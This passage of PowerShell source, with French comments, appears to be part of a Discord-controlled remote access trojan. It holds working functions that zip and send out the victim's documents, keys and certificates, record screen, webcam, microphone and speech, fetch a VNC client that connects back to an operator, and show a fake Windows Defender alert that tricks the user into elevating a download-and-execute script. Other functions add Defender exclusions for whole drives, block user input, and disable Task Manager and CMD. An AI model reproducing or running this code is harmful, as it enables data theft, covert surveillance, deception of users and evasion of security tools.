        Get-ChildItem -Path "$env:temp" -Filter "Exfiltration_*.zip" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
        
        If ($Path -ne $null) {
            $foldersToSearch = @("$env:USERPROFILE\" + $Path)
        }
        else {
            $foldersToSearch = @("$env:USERPROFILE\Desktop", "$env:USERPROFILE\Documents", "$env:USERPROFILE\Downloads", "$env:USERPROFILE\OneDrive", "$env:USERPROFILE\Pictures", "$env:USERPROFILE\Videos")
        }
        If ($FileType -ne $null) {
            $fileExtensions = @("*." + $FileType)
        }
        else {
            $fileExtensions = @("*.log", "*.db", "*.txt", "*.doc", "*.pdf", "*.jpg", "*.jpeg", "*.png", "*.wdoc", "*.xdoc", "*.cer", "*.key", "*.xls", "*.xlsx", "*.cfg", "*.conf", "*.wpd", "*.rft")
        }
        
        Add-Type -AssemblyName System.IO.Compression.FileSystem
        $zipArchive = $null
        
        foreach ($folder in $foldersToSearch) {
            if (-not (Test-Path $folder)) {
                Write-Host "Folder not found: $folder" -ForegroundColor Yellow
                continue
            }
            
            foreach ($extension in $fileExtensions) {
                try {
                    $files = Get-ChildItem -Path $folder -Filter $extension -File -Recurse -ErrorAction SilentlyContinue
                    
                    foreach ($file in $files) {
                        try {
                            if ($zipArchive -eq $null) {
                                $zipFilePath = "$env:temp/Exfiltration_${dateStr}_Part${index}.zip"
                                # Supprimer le fichier s'il existe déjà
                                if (Test-Path $zipFilePath) {
                                    Remove-Item -Path $zipFilePath -Force -ErrorAction SilentlyContinue
                                }
                                $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                                $fileList = @()  # Réinitialiser la liste pour cette archive
                            }
                            
                            $fileSize = $file.Length
                            if ($currentZipSize + $fileSize -gt $maxZipFileSize) {
                                # Fermer et envoyer le ZIP actuel
                                $zipArchive.Dispose()
                                $zipArchive = $null
                                
                                if (Test-Path $zipFilePath) {
                                    $zipInfo = Get-Item $zipFilePath
                                    if ($zipInfo.Length -gt 0) {
                                        # Créer un message de résumé propre pour cette archive (sans markdown complexe)
                                        $archiveSummary = ":package: Archive #$index - $filesProcessed file(s) - $([math]::Round($zipInfo.Length/1MB, 2)) MB`n"
                                        $archiveSummary += "Files:`n"
                                        
                                        # Limiter à 15 fichiers pour éviter les messages trop longs
                                        $filesToShow = if ($fileList.Count -le 15) { $fileList } else { $fileList[0..14] }
                                        foreach ($f in $filesToShow) {
                                            $sizeStr = if ($f.Size -lt 1KB) { "$($f.Size) B" } 
                                                      elseif ($f.Size -lt 1MB) { "$([math]::Round($f.Size/1KB, 2)) KB" }
                                                      else { "$([math]::Round($f.Size/1MB, 2)) MB" }
                                            $archiveSummary += "  - $($f.Name) ($sizeStr)`n"
                                        }
                                        
                                        if ($fileList.Count -gt 15) {
                                            $archiveSummary += "  ... +$($fileList.Count - 15) more file(s)`n"
                                        }
                                        
                                        # Envoyer le fichier d'abord
                                        sendFile -sendfilePath $zipFilePath | Out-Null
                                        Start-Sleep -Seconds 2
                                        
                                        # Envoyer le résumé (limiter la taille pour éviter erreurs 400)
                                        if ($archiveSummary.Length -gt 1900) {
                                            $archiveSummary = ":package: Archive #$index - $filesProcessed file(s) - $([math]::Round($zipInfo.Length/1MB, 2)) MB`n"
                                            $archiveSummary += "First 10 files:`n"
                                            foreach ($f in $fileList[0..9]) {
                                                $archiveSummary += "  - $($f.Name)`n"
                                            }
                                            if ($fileList.Count -gt 10) {
                                                $archiveSummary += "  ... +$($fileList.Count - 10) more"
                                            }
                                        }
                                        
                                        sendMsg -Message "``$archiveSummary``"
                                        Start-Sleep -Seconds 1
                                    }
                                    Remove-Item -Path $zipFilePath -Force -ErrorAction SilentlyContinue
                                }
                                
                                # Créer un nouveau ZIP
                                $index++
                                $zipFilePath = "$env:temp/Exfiltration_${dateStr}_Part${index}.zip"
                                # S'assurer que le nouveau fichier n'existe pas
                                if (Test-Path $zipFilePath) {
                                    Remove-Item -Path $zipFilePath -Force -ErrorAction SilentlyContinue
                                }
                                $zipArchive = [System.IO.Compression.ZipFile]::Open($zipFilePath, 'Create')
                                $currentZipSize = 0
                                $filesProcessed = 0
                                $fileList = @()  # Réinitialiser la liste pour cette archive
                            }
                            
                            # Créer un nom d'entrée propre (relatif au dossier de base)
                            $entryName = $file.FullName.Substring($folder.Length + 1)
                            # Normaliser les séparateurs de chemin pour Windows
                            $entryName = $entryName -replace '\\', '/'
                            
                            [System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile($zipArchive, $file.FullName, $entryName)
                            
                            # Ajouter à la liste des fichiers de cette archive
                            $fileList += [PSCustomObject]@{
                                Name = $file.Name
                                Path = $entryName
                                Size = $fileSize
                                Date = $file.LastWriteTime.ToString("yyyy-MM-dd HH:mm:ss")
                            }
                            
                            $currentZipSize += $fileSize
                            $totalFiles++
                            $totalSize += $fileSize
                            $filesProcessed++
                        }
                        catch {
                            Write-Host "Error processing file $($file.FullName): $($_.Exception.Message)" -ForegroundColor Yellow
                            $filesSkipped++
                            continue
                        }
                    }
                }
                catch {
                    Write-Host "Error searching in $folder for $extension : $($_.Exception.Message)" -ForegroundColor Yellow
                    continue
                }
            }
        }
        
        # Envoyer le dernier ZIP s'il contient des fichiers
        if ($zipArchive -ne $null) {
            $zipArchive.Dispose()
            if (Test-Path $zipFilePath) {
                $zipInfo = Get-Item $zipFilePath
                if ($zipInfo.Length -gt 0) {
                    # Créer un message de résumé propre pour la dernière archive (sans markdown complexe)
                    $archiveSummary = ":package: Archive #$index - $filesProcessed file(s) - $([math]::Round($zipInfo.Length/1MB, 2)) MB`n"
                    $archiveSummary += "Files:`n"
                    
                    # Limiter à 15 fichiers pour éviter les messages trop longs
                    $filesToShow = if ($fileList.Count -le 15) { $fileList } else { $fileList[0..14] }
                    foreach ($f in $filesToShow) {
                        $sizeStr = if ($f.Size -lt 1KB) { "$($f.Size) B" } 
                                  elseif ($f.Size -lt 1MB) { "$([math]::Round($f.Size/1KB, 2)) KB" }
                                  else { "$([math]::Round($f.Size/1MB, 2)) MB" }
                        $archiveSummary += "  - $($f.Name) ($sizeStr)`n"
                    }
                    
                    if ($fileList.Count -gt 15) {
                        $archiveSummary += "  ... +$($fileList.Count - 15) more file(s)`n"
                    }
                    
                    # Envoyer le fichier d'abord
                    sendFile -sendfilePath $zipFilePath | Out-Null
                    Start-Sleep -Seconds 2
                    
                    # Envoyer le résumé (limiter la taille pour éviter erreurs 400)
                    if ($archiveSummary.Length -gt 1900) {
                        $archiveSummary = ":package: Archive #$index - $filesProcessed file(s) - $([math]::Round($zipInfo.Length/1MB, 2)) MB`n"
                        $archiveSummary += "First 10 files:`n"
                        foreach ($f in $fileList[0..9]) {
                            $archiveSummary += "  - $($f.Name)`n"
                        }
                        if ($fileList.Count -gt 10) {
                            $archiveSummary += "  ... +$($fileList.Count - 10) more"
                        }
                    }
                    
                    sendMsg -Message "``$archiveSummary``"
                    Start-Sleep -Seconds 1
                }
                Remove-Item -Path $zipFilePath -Force -ErrorAction SilentlyContinue
            }
        }
        
        # Message de résumé final simplifié (sans markdown complexe pour éviter erreurs 400)
        # Désactiver temporairement le message de résumé pour éviter les erreurs 400 répétées
        # Le message sera envoyé uniquement en cas d'erreur ou si aucun fichier n'est trouvé
        if ($totalFiles -eq 0) {
            $noFilesMsg = ":octagonal_sign: Exfiltration Completed - No files found :octagonal_sign:"
            sendMsg -Message "``$noFilesMsg``"
        }
        # Pour les succès, on n'envoie plus de message pour éviter les erreurs 400
        # L'utilisateur peut voir les fichiers envoyés dans le canal Discord
    }
    catch {
        Write-Host "Critical error in Exfiltrate: $($_.Exception.Message)" -ForegroundColor Red
        $errorMsg = ":octagonal_sign: Exfiltration Failed - Error: $($_.Exception.Message)"
        # Limiter la taille du message d'erreur
        if ($errorMsg.Length -gt 1900) {
            $errorMsg = ":octagonal_sign: Exfiltration Failed - Error: $($_.Exception.Message.Substring(0, 1850))..."
        }
        sendMsg -Message "``$errorMsg``"
        
        # Nettoyer les fichiers ZIP en cas d'erreur
        if ($zipArchive -ne $null) {
            try { $zipArchive.Dispose() } catch {}
        }
        if (Test-Path $zipFilePath) {
            Remove-Item -Path $zipFilePath -Force -ErrorAction SilentlyContinue
        }
    }
}

Function Upload {
    param (
        [Parameter(ValueFromRemainingArguments=$true)]
        [string[]]$Path
    )
    
    # Si aucun paramètre n'est fourni, essayer de parser depuis $args ou $input
    if (-not $Path -or $Path.Count -eq 0) {
        # Essayer de récupérer depuis $args si disponible
        if ($args -and $args.Count -gt 0) {
            $Path = $args
        }
        # Si toujours vide, vérifier si on peut parser depuis le contexte
        if (-not $Path -or $Path.Count -eq 0) {
            sendMsg -Message ":octagonal_sign: ``No path provided. Usage: Upload <path> or Upload -Path <path>`` :octagonal_sign:"
            return
        }
    }
    
    # Traiter chaque chemin fourni
    foreach ($singlePath in $Path) {
        if ([string]::IsNullOrWhiteSpace($singlePath)) {
            continue
        }
        
        # Nettoyer le chemin (supprimer les guillemets si présents)
        $singlePath = $singlePath.Trim('"', "'")
        
        if (-not (Test-Path -Path $singlePath -ErrorAction SilentlyContinue)) {
            $errorMsg = "Path not found: $singlePath"
            if ($errorMsg.Length -gt 1900) {
                $errorMsg = "Path not found: " + (Split-Path -Leaf $singlePath)
            }
            sendMsg -Message ":octagonal_sign: ``$errorMsg`` :octagonal_sign:"
            continue
        }
        
        try {
            $item = Get-Item -Path $singlePath -ErrorAction Stop
            $maxFileSize = 25MB
            $fileName = $item.Name
            
            if ($item.PSIsContainer) {
                # C'est un dossier, le zipper
                $tempZipFilePath = [System.IO.Path]::Combine(
                    [System.IO.Path]::GetTempPath(), 
                    "$($item.Name)_$(Get-Date -Format 'yyyyMMddHHmmss').zip"
                )
                
                # Supprimer le fichier ZIP s'il existe déjà
                if (Test-Path $tempZipFilePath) {
                    Remove-Item -Path $tempZipFilePath -Force -ErrorAction SilentlyContinue
                }
                
                try {
                    Add-Type -AssemblyName System.IO.Compression.FileSystem
                    [System.IO.Compression.ZipFile]::CreateFromDirectory($singlePath, $tempZipFilePath, [System.IO.Compression.CompressionLevel]::Optimal, $false)
                    
                    $zipInfo = Get-Item $tempZipFilePath
                    if ($zipInfo.Length -gt 0) {
                        sendFile -sendfilePath $tempZipFilePath | Out-Null
                        Start-Sleep -Seconds 2
                        sendMsg -Message ":white_check_mark: ``Folder uploaded: $fileName ($([math]::Round($zipInfo.Length/1MB, 2)) MB)`` :white_check_mark:"
                    }
                    Remove-Item -Path $tempZipFilePath -Force -ErrorAction SilentlyContinue
                }
                catch {
                    $errorMsg = "Failed to zip folder: $fileName - $($_.Exception.Message)"
                    if ($errorMsg.Length -gt 1900) {
                        $errorMsg = "Failed to zip folder: $fileName"
                    }
                    sendMsg -Message ":octagonal_sign: ``$errorMsg`` :octagonal_sign:"
                }
            }
            else {
                # C'est un fichier
                if ($item.Length -gt $maxFileSize) {
                    sendMsg -Message ":hourglass: ``Compressing large file: $fileName ($([math]::Round($item.Length/1MB, 2)) MB)...`` :hourglass:"
                    $tempZip = "$env:TEMP\upload_$(Get-Date -Format 'yyyyMMddHHmmss')_$(Get-Random).zip"
                    
                    # Supprimer le fichier ZIP s'il existe déjà
                    if (Test-Path $tempZip) {
                        Remove-Item -Path $tempZip -Force -ErrorAction SilentlyContinue
                    }
                    
                    try {
                        Compress-Archive -Path $singlePath -DestinationPath $tempZip -Force -CompressionLevel Optimal
                        $zipInfo = Get-Item $tempZip
                        if ($zipInfo.Length -gt 0) {
                            sendFile -sendfilePath $tempZip | Out-Null
                            Start-Sleep -Seconds 2
                            sendMsg -Message ":white_check_mark: ``File uploaded: $fileName ($([math]::Round($zipInfo.Length/1MB, 2)) MB compressed)`` :white_check_mark:"
                        }
                        Remove-Item -Path $tempZip -Force -ErrorAction SilentlyContinue
                    }
                    catch {
                        $errorMsg = "Failed to compress: $fileName - $($_.Exception.Message)"
                        if ($errorMsg.Length -gt 1900) {
                            $errorMsg = "Failed to compress: $fileName"
                        }
                        sendMsg -Message ":octagonal_sign: ``$errorMsg`` :octagonal_sign:"
                    }
                }
                else {
                    sendFile -sendfilePath $singlePath | Out-Null
                    Start-Sleep -Seconds 1
                    sendMsg -Message ":white_check_mark: ``File uploaded: $fileName ($([math]::Round($item.Length/1MB, 2)) MB)`` :white_check_mark:"
                }
            }
        }
        catch {
            $errorMsg = "Error uploading: $singlePath - $($_.Exception.Message)"
            if ($errorMsg.Length -gt 1900) {
                $errorMsg = "Error uploading: " + (Split-Path -Leaf $singlePath)
            }
            sendMsg -Message ":octagonal_sign: ``$errorMsg`` :octagonal_sign:"
        }
    }
}

Function SpeechToText {
    try {
        Add-Type -AssemblyName System.Speech -ErrorAction Stop
        $speech = New-Object System.Speech.Recognition.SpeechRecognitionEngine -ErrorAction Stop
        $grammar = New-Object System.Speech.Recognition.DictationGrammar -ErrorAction Stop
        $speech.LoadGrammar($grammar)
        $speech.SetInputToDefaultAudioDevice()
        
        sendMsg -Message ":microphone: ``Speech-to-Text started. Say 'kill' to stop.`` :microphone:"
        
        while ($true) {
            try {
                $result = $speech.Recognize()
                if ($result -and $result.Text) {
                    $results = $result.Text.Trim()
                    if (-not [string]::IsNullOrWhiteSpace($results)) {
                        Write-Output $results
                        # Nettoyer le texte et limiter la taille
                        $cleanResults = $results -replace "[\x00-\x1F]", ""
                        if ($cleanResults.Length -gt 1900) {
                            $cleanResults = $cleanResults.Substring(0, 1900) + "..."
                        }
                        sendMsg -Message ":microphone: ``$cleanResults`` :microphone:"
                    }
                }
            }
            catch {
                # Ignorer les erreurs de reconnaissance silencieuses
            }
            
            PullMsg
            if ($response -like "*kill*") {
                $script:previouscmd = $response
                sendMsg -Message ":stop_sign: ``Speech-to-Text stopped`` :stop_sign:"
                break
            }
        }
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Failed to start Speech-to-Text: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function StartUvnc {
    param([string]$ip, [string]$port)

    sendMsg -Message ":arrows_counterclockwise: ``Starting UVNC Client..`` :arrows_counterclockwise:"
    $tempFolder = "$env:temp\vnc"
    $vncDownload = "https://github.com/benzoXdev/assets/raw/main/winvnc.zip"
    $vncZip = "$tempFolder\winvnc.zip" 
    if (!(Test-Path -Path $tempFolder)) {
        New-Item -ItemType Directory -Path $tempFolder | Out-Null
    }  
    if (!(Test-Path -Path $vncZip)) {
        Iwr -Uri $vncDownload -OutFile $vncZip
    }
    sleep 1
    Expand-Archive -Path $vncZip -DestinationPath $tempFolder -Force
    sleep 1
    rm -Path $vncZip -Force  
    $proc = "$tempFolder\winvnc.exe"
    Start-Process $proc -ArgumentList ("-run")
    sleep 2
    Start-Process $proc -ArgumentList ("-connect $ip::$port")
    
}

Function RecordScreen {
    param ([int[]]$t)
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)) {  
        GetFfmpeg
    }
    sendMsg -Message ":arrows_counterclockwise: ``Recording screen for $t seconds..`` :arrows_counterclockwise:"
    $mkvPath = "$env:Temp\ScreenClip.mp4"
    if ($t.Length -eq 0) { $t = 10 }
    .$env:Temp\ffmpeg.exe -f gdigrab -framerate 10 -t 20 -i desktop -vcodec libx264 -preset fast -crf 18 -pix_fmt yuv420p -movflags +faststart $mkvPath
    # .$env:Temp\ffmpeg.exe -f gdigrab -t 10 -framerate 30 -i desktop $mkvPath
    sendFile -sendfilePath $mkvPath | Out-Null
    sleep 5
    rm -Path $mkvPath -Force
}

# Manual capture functions with confirmation
Function TakePhoto {
    sendMsg -Message ":warning: ``CONFIRMATION REQUIRED: TakePhoto command received. Executing camera capture...`` :warning:"
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)) {  
        GetFfmpeg
    }
    $imagePath = "$env:Temp\Photo_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
    $Input = (Get-CimInstance Win32_PnPEntity | ? { $_.PNPClass -eq 'Camera' } | select -First 1).Name
    if (!($input)) { $Input = (Get-CimInstance Win32_PnPEntity | ? { $_.PNPClass -eq 'Image' } | select -First 1).Name }
    if ($Input) {
        try {
            .$env:Temp\ffmpeg.exe -f dshow -i video="$Input" -frames:v 1 -y $imagePath 2>&1 | Out-Null
            if (Test-Path $imagePath) {
                if ($global:WebcamID) {
                    sendFile -sendfilePath $imagePath -ChannelID $global:WebcamID
                    sendMsg -Message ":white_check_mark: ``Photo captured and sent successfully`` :white_check_mark:" -ChannelID $global:WebcamID
                }
                else {
                    sendFile -sendfilePath $imagePath
                    sendMsg -Message ":white_check_mark: ``Photo captured and sent successfully`` :white_check_mark:"
                }
                sleep 2
                rm -Path $imagePath -Force
            }
            else {
                sendMsg -Message ":octagonal_sign: ``Failed to capture photo`` :octagonal_sign:"
            }
        }
        catch {
            sendMsg -Message ":octagonal_sign: ``Error capturing photo: $($_.Exception.Message)`` :octagonal_sign:"
        }
    }
    else {
        sendMsg -Message ":octagonal_sign: ``No camera device found`` :octagonal_sign:"
    }
}

Function TakeScreenshot {
    sendMsg -Message ":warning: ``CONFIRMATION REQUIRED: TakeScreenshot command received. Executing screenshot capture...`` :warning:"
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)) {  
        GetFfmpeg
    }
    $screenshotPath = "$env:Temp\Screenshot_$(Get-Date -Format 'yyyyMMdd_HHmmss').jpg"
    try {
        .$env:Temp\ffmpeg.exe -f gdigrab -i desktop -frames:v 1 -vf "fps=1" $screenshotPath 2>&1 | Out-Null
        if (Test-Path $screenshotPath) {
            if ($global:ScreenshotID) {
                sendFile -sendfilePath $screenshotPath -ChannelID $global:ScreenshotID
                sendMsg -Message ":white_check_mark: ``Screenshot captured and sent successfully`` :white_check_mark:" -ChannelID $global:ScreenshotID
            }
            else {
                sendFile -sendfilePath $screenshotPath
                sendMsg -Message ":white_check_mark: ``Screenshot captured and sent successfully`` :white_check_mark:"
            }
            sleep 2
            rm -Path $screenshotPath -Force
        }
        else {
            sendMsg -Message ":octagonal_sign: ``Failed to capture screenshot`` :octagonal_sign:"
        }
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Error capturing screenshot: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function RecordAudioClip {
    param ([Parameter(Position = 0)][int]$Duration = 10)
    sendMsg -Message ":warning: ``CONFIRMATION REQUIRED: RecordAudioClip command received. Recording $Duration seconds of audio...`` :warning:"
    $Path = "$env:Temp\ffmpeg.exe"
    If (!(Test-Path $Path)) {  
        GetFfmpeg
    }
    $outputFile = "$env:Temp\AudioClip_$(Get-Date -Format 'yyyyMMdd_HHmmss').mp3"
    Add-Type '[Guid("D666063F-1587-4E43-81F1-B948E807363F"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDevice {int a(); int o();int GetId([MarshalAs(UnmanagedType.LPWStr)] out string id);}[Guid("A95664D2-9614-4F35-A746-DE8DB63617E6"), InterfaceType(ComInterfaceType.InterfaceIsIUnknown)]interface IMMDeviceEnumerator {int f();int GetDefaultAudioEndpoint(int dataFlow, int role, out IMMDevice endpoint);}[ComImport, Guid("BCDE0395-E52F-467C-8E3D-C4579291692E")] class MMDeviceEnumeratorComObject { }public static string GetDefault (int direction) {var enumerator = new MMDeviceEnumeratorComObject() as IMMDeviceEnumerator;IMMDevice dev = null;Marshal.ThrowExceptionForHR(enumerator.GetDefaultAudioEndpoint(direction, 1, out dev));string id = null;Marshal.ThrowExceptionForHR(dev.GetId(out id));return id;}' -name audio -Namespace system
    function getFriendlyName($id) {
        $reg = "HKLM:\SYSTEM\CurrentControlSet\Enum\SWD\MMDEVAPI\$id"
        return (get-ItemProperty $reg).FriendlyName
    }
    try {
        $id1 = [audio]::GetDefault(1)
        $MicName = "$(getFriendlyName $id1)"
        .$env:Temp\ffmpeg.exe -f dshow -i audio="$MicName" -t $Duration -c:a libmp3lame -ar 44100 -b:a 128k -ac 1 $outputFile 2>&1 | Out-Null
        if (Test-Path $outputFile) {
            if ($global:MicrophoneID) {
                sendFile -sendfilePath $outputFile -ChannelID $global:MicrophoneID
                sendMsg -Message ":white_check_mark: ``Audio clip recorded and sent successfully ($Duration seconds)`` :white_check_mark:" -ChannelID $global:MicrophoneID
            }
            else {
                sendFile -sendfilePath $outputFile
                sendMsg -Message ":white_check_mark: ``Audio clip recorded and sent successfully ($Duration seconds)`` :white_check_mark:"
            }
            sleep 2
            rm -Path $outputFile -Force
        }
        else {
            sendMsg -Message ":octagonal_sign: ``Failed to record audio clip`` :octagonal_sign:"
        }
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Error recording audio: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

# --------------------------------------------------------------- ADMIN FUNCTIONS ------------------------------------------------------------------------

Function IsAdmin {
    If (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) {
        sendMsg -Message ":octagonal_sign: ``Not Admin!`` :octagonal_sign:"
    }
    else {
        sendMsg -Message ":white_check_mark: ``You are Admin!`` :white_check_mark:"
    }
}

Function Elevate {
    Add-Type -AssemblyName System.Windows.Forms
    Add-Type -AssemblyName System.Drawing
    Add-Type -AssemblyName Microsoft.VisualBasic
    [System.Windows.Forms.Application]::EnableVisualStyles()
    $errorForm = New-Object Windows.Forms.Form
    $errorForm.Width = 400
    $errorForm.Height = 180
    $errorForm.TopMost = $true
    $errorForm.StartPosition = 'CenterScreen'
    $errorForm.Text = 'Windows Defender Alert'
    $errorForm.Font = 'Microsoft Sans Serif,10'
    $icon = [System.Drawing.SystemIcons]::Information
    $errorForm.Icon = $icon
    $errorForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::FixedDialog
    $label = New-Object Windows.Forms.Label
    $label.AutoSize = $false
    $label.Width = 380
    $label.Height = 80
    $label.TextAlign = 'MiddleCenter'
    $label.Text = "Windows Defender has found critical vulnerabilities`n`nWindows will now attempt to apply important security updates to automatically fix these issues in the background"
    $label.Location = New-Object System.Drawing.Point(10, 10)
    $icon = [System.Drawing.Icon]::ExtractAssociatedIcon("C:\Windows\System32\UserAccountControlSettings.exe")
    $iconBitmap = $icon.ToBitmap()
    $resizedIcon = New-Object System.Drawing.Bitmap(16, 16)
    $graphics = [System.Drawing.Graphics]::FromImage($resizedIcon)
    $graphics.DrawImage($iconBitmap, 0, 0, 16, 16)
    $graphics.Dispose()
    $okButton = New-Object Windows.Forms.Button
    $okButton.Text = "  Apply Fix"
    $okButton.Width = 110
    $okButton.Height = 25
    $okButton.Location = New-Object System.Drawing.Point(185, 110)
    $okButton.Image = $resizedIcon
    $okButton.TextImageRelation = 'ImageBeforeText'
    $cancelButton = New-Object Windows.Forms.Button
    $cancelButton.Text = "Cancel "
    $cancelButton.Width = 80
    $cancelButton.Height = 25
    $cancelButton.Location = New-Object System.Drawing.Point(300, 110)
    $errorForm.controls.AddRange(@($label, $okButton, $cancelButton))
    $okButton.Add_Click({
            $errorForm.Close()
            $graphics.Dispose()
            # Créer un script PowerShell temporaire qui sera exécuté avec élévation
            $tempScript = "$env:TEMP\elevate_script.ps1"
            $scriptContent = @"
# Elevated Discord C2 Client
`$global:token = '$token'
`$global:parent = '$parent'
`$HideConsole = 1
`$spawnChannels = 0
`$InfoOnConnect = 0
`$defaultstart = 0
`$global:parent = '$parent'
irm `$parent | iex
"@
            $scriptContent | Out-File -FilePath $tempScript -Force -Encoding UTF8
            # Utiliser Shell.Application.ShellExecute avec runas pour obtenir les privilèges admin
            $vbsContent = @"
Set objShell = CreateObject("Shell.Application")
objShell.ShellExecute "powershell.exe", "-NonI -NoP -Ep Bypass -W Hidden -File ""$tempScript""", "", "runas", 0
"@
            $vbsPath = "$env:TEMP\elevate.vbs"
            $vbsContent | Out-File -FilePath $vbsPath -Force -Encoding ASCII
            try {
                # Exécuter le script VBS qui va demander l'élévation
                $process = Start-Process -FilePath "wscript.exe" -ArgumentList "`"$vbsPath`"" -WindowStyle Hidden -PassThru
                Start-Sleep -Seconds 2
                # Nettoyer les fichiers temporaires après un délai
                Start-Job -ScriptBlock {
                    Start-Sleep -Seconds 10
                    if (Test-Path "$env:TEMP\elevate.vbs") { Remove-Item -Path "$env:TEMP\elevate.vbs" -Force -ErrorAction SilentlyContinue }
                    if (Test-Path "$env:TEMP\elevate_script.ps1") { Remove-Item -Path "$env:TEMP\elevate_script.ps1" -Force -ErrorAction SilentlyContinue }
                } | Out-Null
                sendMsg -Message ":white_check_mark: ``UAC Prompt sent to the current user. Please accept to elevate privileges. A new elevated session will start in a few seconds.`` :white_check_mark:"
            }
            catch {
                sendMsg -Message ":octagonal_sign: ``Failed to elevate: $($_.Exception.Message)`` :octagonal_sign:"
            }
            return                   
        })
    $cancelButton.Add_Click({
            $errorForm.Close()
            $graphics.Dispose()
            return                    
        })
    [void]$errorForm.ShowDialog()
}

Function ExcludeCDrive {
    Add-MpPreference -ExclusionPath C:\
    sendMsg -Message ":white_check_mark: ``C:/ Drive Excluded`` :white_check_mark:"
}

Function ExcludeALLDrives {
    Add-MpPreference -ExclusionPath C:\
    Add-MpPreference -ExclusionPath D:\
    Add-MpPreference -ExclusionPath E:\
    Add-MpPreference -ExclusionPath F:\
    Add-MpPreference -ExclusionPath G:\
    sendMsg -Message ":white_check_mark: ``All Drives C:/ - G:/ Excluded`` :white_check_mark:"
}

Function EnableIO {
    $signature = '[DllImport("user32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
    Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
    [Win32Functions.User32]::BlockInput($false)
    sendMsg -Message ":white_check_mark: ``IO Enabled`` :white_check_mark:"
}

Function DisableIO {
    $signature = '[DllImport("user32.dll", SetLastError = true)][return: MarshalAs(UnmanagedType.Bool)]public static extern bool BlockInput(bool fBlockIt);'
    Add-Type -MemberDefinition $signature -Name User32 -Namespace Win32Functions
    [Win32Functions.User32]::BlockInput($true)
    sendMsg -Message ":octagonal_sign: ``IO Disabled`` :octagonal_sign:"
}

# --------------------------------------------------------------- SYSTEM RESTRICTION FUNCTIONS ------------------------------------------------------------------------

Function DisableTaskManager {
    try {
        # Vérifier les droits admin
        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
        
        if ($isAdmin) {
            # Utiliser HKLM pour tous les utilisateurs
            $regPath = "HKLM:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            Set-ItemProperty -Path $regPath -Name "DisableTaskMgr" -Value 1 -Type DWord -Force -ErrorAction Stop
        }
        else {
            # Utiliser HKCU pour l'utilisateur actuel seulement
            $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            Set-ItemProperty -Path $regPath -Name "DisableTaskMgr" -Value 1 -Type DWord -Force -ErrorAction Stop
        }
        
        sendMsg -Message ":white_check_mark: ``Task Manager disabled`` :white_check_mark:"
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Failed to disable Task Manager: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function EnableTaskManager {
    try {
        # Vérifier les droits admin
        if (-not ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')) {
            sendMsg -Message ":octagonal_sign: ``Administrator privileges required to enable Task Manager`` :octagonal_sign:"
            return
        }
        
        $regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System"
        if (Test-Path $regPath) {
            Remove-ItemProperty -Path $regPath -Name "DisableTaskMgr" -ErrorAction Stop
            sendMsg -Message ":white_check_mark: ``Task Manager enabled`` :white_check_mark:"
        }
        else {
            sendMsg -Message ":white_check_mark: ``Task Manager is already enabled`` :white_check_mark:"
        }
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Failed to enable Task Manager: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function DisableCMD {
    try {
        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
        
        if ($isAdmin) {
            # Utiliser HKLM pour tous les utilisateurs
            $regPath = "HKLM:\Software\Policies\Microsoft\Windows\System"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            Set-ItemProperty -Path $regPath -Name "DisableCMD" -Value 2 -Type DWord -Force -ErrorAction Stop
        }
        else {
            # Utiliser HKCU pour l'utilisateur actuel seulement
            $regPath = "HKCU:\Software\Policies\Microsoft\Windows\System"
            if (-not (Test-Path $regPath)) {
                New-Item -Path $regPath -Force | Out-Null
            }
            Set-ItemProperty -Path $regPath -Name "DisableCMD" -Value 2 -Type DWord -Force -ErrorAction Stop
        }
        
        sendMsg -Message ":white_check_mark: ``CMD disabled`` :white_check_mark:"
    }
    catch {
        sendMsg -Message ":octagonal_sign: ``Failed to disable CMD: $($_.Exception.Message)`` :octagonal_sign:"
    }
}

Function EnableCMD {
    try {
        $isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] 'Administrator')
        $removed = $false
        
        if ($isAdmin) {
            # Vérifier et supprimer depuis HKLM
            $regPath = "HKLM:\Software\Policies\Microsoft\Windows\System"
            if (Test-Path $regPath) {
                $prop = Get-ItemProperty -Path $regPath -Name "DisableCMD" -ErrorAction SilentlyContinue
                if ($prop) {
